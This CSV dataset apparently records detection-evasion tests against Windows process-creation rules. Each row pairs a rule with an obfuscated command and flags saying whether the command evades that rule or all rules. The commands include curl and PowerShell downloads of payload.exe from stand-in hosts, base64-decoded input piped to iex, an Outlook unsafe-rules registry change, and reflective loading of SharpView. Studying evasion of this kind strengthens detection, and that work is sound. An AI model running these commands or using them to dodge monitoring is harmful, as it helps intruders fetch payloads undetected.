Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl http://example.com/payload.exe -o %USERPROFILE%\AppData\Roaming\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl http://example.local/test.txt -o C:\Users\Public\AppData\Roaming\test.txt""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl http://example.local/test.txt -o C:\Users\Public\AppData\Roaming\test.txt""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""set A=App&& set D=Data&& cmd /c curl h^ttp://example.local/test.txt -o %USERPROFILE%\%A%%D%\Roaming\test.txt""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /V:ON /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /V:oN /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /v:on /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /""V:ON"" /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /v:ON /C ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -Command ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile ""$env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -ComMAnd ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -COMmANd ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe /""Command"" ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -c ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -COmmANd ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -COMmAND ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell.exe /""Command"" ""$client = New-Object System.Net.WebClient; $method = 'Download' + 'File'; $client.$method('http://example.com/test.txt', 'C:\test.txt')""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell.exe -""Command"" ""$client = New-Object System.Net.WebClient; $method = 'Download' + 'File'; $client.$method('http://example.com/test.txt', 'C:\test.txt')""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell.exe /""Command"" ""$wc = New-Object ('System.N' + 'et.WebClient'); $wc.DownloadFile('http://example.com/test.txt', 'C:\test.txt')""",TRUE,TRUE,TRUE,
t1105,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell -""c"" ""(New-Object Net.WebClient).DownloadFile('http://malicious.com/payload.exe', 'C:\payload.exe')""",TRUE,TRUE,FALSE,PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell /""c"" ""(New-Object Net.WebClient).DownloadFile('http://malicious.com/payload.exe', 'C:\payload.exe')""",TRUE,TRUE,FALSE,PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell.exe -""c"" ""Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'C:\payload.exe'""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell.exe /""c"" ""Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'C:\payload.exe'""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell.exe /""Command"" ""$wc = New-Object System.Net.WebClient; $method = 'Download' + 'File'; $wc.$method.Invoke('http://example.com/payload.exe', 'C:\Temp\payload.exe')""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell.exe /""Command"" ""(New-Object Net.WebClient).DownloadFile('http://example.com/payload.exe', 'C:\Temp\payload.exe')""",TRUE,TRUE,FALSE,PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell.exe -""Command"" ""(New-Object Net.WebClient).DownloadFile('http://example.com/payload.exe', 'C:\Temp\payload.exe')""",TRUE,TRUE,FALSE,PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1134.004,proc_creation_win_powershell_base64_frombase64string,PowerShell Base64 Encoded FromBase64String Cmdlet,fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c,,"powershell.exe /""Command"" ""$b64 = 'd2hvYW1p'; [System.Text.Encoding]::UTF8.GetString([System.Convert]::('F'+'romBase64S'+'tring').Invoke($b64)) | iex""",TRUE,TRUE,FALSE,Suspicious PowerShell IEX Execution Patterns (09576804-7a05-458e-a817-eb718ca91f54); Suspicious PowerShell IEX Execution Patterns (09576804-7a05-458e-a817-eb718ca91f54)
t1134.004,proc_creation_win_powershell_base64_frombase64string,PowerShell Base64 Encoded FromBase64String Cmdlet,fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c,,"powershell.exe -""Command"" ""$method = 'From' + 'Base64String'; $payload = [Convert]::$method('d2hvYW1p'); [System.Text.Encoding]::UTF8.GetString($payload) | Invoke-Expression""",TRUE,TRUE,TRUE,
t1134.004,proc_creation_win_powershell_base64_frombase64string,PowerShell Base64 Encoded FromBase64String Cmdlet,fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c,,"powershell.exe -""Command"" ""[Convert]::FromBase64String('d2hvYW1p')""",TRUE,TRUE,FALSE,Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a)
t1134.004,proc_creation_win_powershell_base64_frombase64string,PowerShell Base64 Encoded FromBase64String Cmdlet,fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c,,"powershell.exe /""Command"" ""[Convert]::FromBase64String('d2hvYW1p')""",TRUE,TRUE,FALSE,Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a); Base64 Encoded PowerShell Command Detected (e32d4572-9826-4738-b651-95fa63747e8a)
t1134.004,proc_creation_win_powershell_frombase64string,Base64 Encoded PowerShell Command Detected,e32d4572-9826-4738-b651-95fa63747e8a,,"powershell.exe -""Command"" ""$method = 'FromBase' + '64String'; [Convert]::$method('SGVsbG8gV29ybGQ=')""",TRUE,TRUE,TRUE,
t1134.004,proc_creation_win_powershell_frombase64string,Base64 Encoded PowerShell Command Detected,e32d4572-9826-4738-b651-95fa63747e8a,,"powershell.exe /""Command"" ""$method = 'FromBase' + '64String'; [Convert]::$method('SGVsbG8gV29ybGQ=')""",TRUE,TRUE,TRUE,
t1134.004,proc_creation_win_powershell_frombase64string,Base64 Encoded PowerShell Command Detected,e32d4572-9826-4738-b651-95fa63747e8a,,"powershell.exe /""EncodedCommand"" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAYQBsAGMALgBlAHgAZQA=",TRUE,TRUE,TRUE,
t1202,proc_creation_win_office_outlook_enable_unsafe_client_mail_rules,Outlook EnableUnsafeClientMailRules Setting Enabled,55f0a3a1-846e-40eb-8273-677371b8d912,,"cmd.exe /c ""reg add HKCU\Software\Microsoft\Office\16.0\Outlook\Security /v EnableUn^safeClientMailRules /t REG_DWORD /d 1 /f""",TRUE,TRUE,TRUE,
t1202,proc_creation_win_office_outlook_enable_unsafe_client_mail_rules,Outlook EnableUnsafeClientMailRules Setting Enabled,55f0a3a1-846e-40eb-8273-677371b8d912,,"reg.exe add ""HKCU\Software\Policies\Microsoft\Office\16.0\Outlook\Security"" /v EnableUnsafeClientMailRules /t REG_DWORD /d 1 /f",TRUE,TRUE,TRUE,
t1202,proc_creation_win_office_outlook_enable_unsafe_client_mail_rules,Outlook EnableUnsafeClientMailRules Setting Enabled,55f0a3a1-846e-40eb-8273-677371b8d912,,"powershell.exe -""c"" ""New-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\16.0\Outlook\Security' -Name 'EnableUnsafeClientMailRules' -Value 1 -PropertyType DWORD""",TRUE,TRUE,TRUE,
t1216,proc_creation_win_lolbin_manage_bde,Potential Manage-bde.wsf Abuse To Proxy Execution,c363385c-f75d-4753-a108-c1a8e28bdbda,,"cmd.exe /c ""cd /d C:\Windows\System32\ && cscript.exe //nologo manage-bde.wsf""",TRUE,TRUE,TRUE,
t1564.004,proc_creation_win_susp_hidden_dir_index_allocation,Potential Hidden Directory Creation Via NTFS INDEX_ALLOCATION Stream - CLI,0900463c-b33b-49a8-be1d-552a3b553dae,,"""cmd.exe"" /c md %temp%\...$.......::""$index_allocation"" & echo too many secrets > %temp%\...$.......::""$index_allocation""\secrets.txt",TRUE,TRUE,TRUE,
t1007,proc_creation_win_reg_query_registry,Potential Configuration And Service Reconnaissance Via Reg.EXE,970007b7-ce32-49d0-a4a4-fbef016950bd,,"powershell.exe /""Command"" ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'""",TRUE,TRUE,TRUE,
t1007,proc_creation_win_reg_query_registry,Potential Configuration And Service Reconnaissance Via Reg.EXE,970007b7-ce32-49d0-a4a4-fbef016950bd,,"powershell.exe /""Command"" ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'""",TRUE,TRUE,TRUE,
t1007,proc_creation_win_reg_query_registry,Potential Configuration And Service Reconnaissance Via Reg.EXE,970007b7-ce32-49d0-a4a4-fbef016950bd,,"powershell.exe -""Command"" ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'""",TRUE,TRUE,TRUE,
t1016,proc_creation_win_susp_network_command,Suspicious Network Command,a29c1813-ab1f-4dde-b489-330b952e91ae,,"""cmd.exe"" /c ipconfig /a^ll",TRUE,TRUE,TRUE,
t1016,proc_creation_win_susp_network_command,Suspicious Network Command,a29c1813-ab1f-4dde-b489-330b952e91ae,,"""cmd.exe"" /c set C=config && net %C% workstation",TRUE,TRUE,TRUE,
t1016,proc_creation_win_susp_network_command,Suspicious Network Command,a29c1813-ab1f-4dde-b489-330b952e91ae,,"""cmd.exe"" /c arp -""a""",TRUE,TRUE,TRUE,
t1016,proc_creation_win_susp_network_command,Suspicious Network Command,a29c1813-ab1f-4dde-b489-330b952e91ae,,"""cmd.exe"" /c route pr^int",TRUE,TRUE,TRUE,
t1049,proc_creation_win_hktl_sharpview,HackTool - SharpView Execution,b2317cfa-4a47-4ead-b3ff-297438c0bc2d,,"powershell.exe /""Command"" ""[Reflection.Assembly]::Load([IO.File]::ReadAllBytes('C:\temp\sv_mod.bin')).EntryPoint.Invoke($null, @(,[string[]]@('Get-Doma'+'inComputer')))""",TRUE,TRUE,TRUE,
t1049,proc_creation_win_hktl_sharpview,HackTool - SharpView Execution,b2317cfa-4a47-4ead-b3ff-297438c0bc2d,,"powershell.exe -""Command"" ""[Reflection.Assembly]::Load([IO.File]::ReadAllBytes('C:\temp\sv_mod.bin')).EntryPoint.Invoke($null, @(,[string[]]@('Get-Doma'+'inComputer')))""",TRUE,TRUE,TRUE,
t1049,proc_creation_win_hktl_sharpview,HackTool - SharpView Execution,b2317cfa-4a47-4ead-b3ff-297438c0bc2d,,"powershell.exe -""NoProfile"" /""ExecutionPolicy"" Bypass -cOmmAND ""Add-Type -Path 'C:\Windows\Temp\SharpView.dll'; [SharpView.Program]::GetDomainComputers()""",TRUE,TRUE,FALSE,Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33)
t1049,proc_creation_win_hktl_sharpview,HackTool - SharpView Execution,b2317cfa-4a47-4ead-b3ff-297438c0bc2d,,"powershell.exe -nop /""ExecutionPolicy"" Bypass /""Command"" ""Add-Type -Path 'C:\Windows\Temp\SharpView.dll'; [SharpView.Program]::GetDomainComputers()""",TRUE,TRUE,FALSE,Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33)
t1049,proc_creation_win_hktl_sharpview,HackTool - SharpView Execution,b2317cfa-4a47-4ead-b3ff-297438c0bc2d,,"powershell.exe -nop -ExeCUTIONPOLICY Bypass /""Command"" ""Add-Type -Path 'C:\Windows\Temp\SharpView.dll'; [SharpView.Program]::GetDomainComputers()""",TRUE,TRUE,FALSE,Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1049,proc_creation_win_hktl_sharpview,HackTool - SharpView Execution,b2317cfa-4a47-4ead-b3ff-297438c0bc2d,,"powershell.exe /""NoProfile"" -EXeCutIONPOlIcY Bypass -c ""Add-Type -Path 'C:\Windows\Temp\SharpView.dll'; [SharpView.Program]::GetDomainComputers()""",TRUE,TRUE,FALSE,Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1049,proc_creation_win_hktl_sharpview,HackTool - SharpView Execution,b2317cfa-4a47-4ead-b3ff-297438c0bc2d,,"powershell.exe -nOpROfILe -ep Bypass /""Command"" ""Add-Type -Path 'C:\Windows\Temp\SharpView.dll'; [SharpView.Program]::GetDomainComputers()""",TRUE,TRUE,FALSE,Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Script Interpreter Execution From Suspicious Folder (1228c958-e64e-4e71-92ad-7d429f4138ba); Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1049,proc_creation_win_hktl_sharpview,HackTool - SharpView Execution,b2317cfa-4a47-4ead-b3ff-297438c0bc2d,,"powershell.exe -nop /""ExecutionPolicy"" Bypass -COmMaNd ""Add-Type -Path 'C:\Windows\Temp\SharpView.dll'; [SharpView.Program]::GetDomainComputers()""",TRUE,TRUE,FALSE,Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33)
